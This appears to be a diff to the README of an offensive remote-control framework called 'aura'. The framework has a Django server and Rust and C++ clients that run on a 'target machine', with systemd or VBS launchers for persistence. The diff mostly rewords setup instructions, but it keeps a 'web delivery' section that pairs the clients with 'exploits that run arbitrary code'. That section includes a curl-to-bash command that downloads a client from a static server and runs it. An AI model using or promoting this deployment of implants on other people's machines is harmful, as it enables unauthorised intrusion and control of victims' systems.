@@ -19,12 +19,12 @@ accessed after setting up the database and a superuser (see below).
 
 Database
 ---
-The Django server is currently configured with a simple setup for mysql. The
+The Django server is currently configured for use with mysql/mariadb. The
 current configuration can be changed in the *settings.py* file under
 `django-server/aura`. You would, of course, need to setup the database on your
-machine. You may wish to switch use postgresql, or even sqlite instead; this
-easy to do thanks to Django's database API. More information on configuring this
-and the admin console can be found in the following
+machine. You may wish to use postgresql, or even sqlite instead; this
+easy to do thanks to Django's portable database API. More information on
+configuring this and the admin console can be found in the following
 [tutorial](https://docs.djangoproject.com/en/1.11/intro/tutorial02/)
 and [documentation](https://docs.djangoproject.com/en/1.11/ref/databases/).
 
@@ -54,7 +54,10 @@ cargo build --release
 
 The binary will be sent to `client/rust-*/target/release/`.
 
-The client simply needs to be run in the same folder as any necessary components
+*NOTE:* For the C++ client, go into the client directory `alt-client/cpp/cpp-linux`
+and run `make`.
+
+The client executable or script simply needs to be run in the same folder as any necessary components
 (systemd services for Linux clients and launcher.vbs for Powershell) on the
 target machine, or installed via web delivery (see below).
 
@@ -62,9 +65,10 @@ Client Web Delivery
 ---
 The *static* folder can be used to store files to be served by a web server --
 preferably an nginx server running on a different port or host as your Django
-server. You will need to edit the index files, compile, and place the files into
-the folders. The simplicity of executing a web delivery makes it easy to
-integrate with exploits that run arbitrary code. An example in bash would be:
+server. You will need to compile and place the files into the folders, and edit
+the index files to reflect any changes like the server name. The simplicity of
+executing via web delivery makes it easy to integrate with exploits that run
+arbitrary code. An example in bash would be:
 
 ```
 curl http://static-server-name/welcome/linux/rust | bash
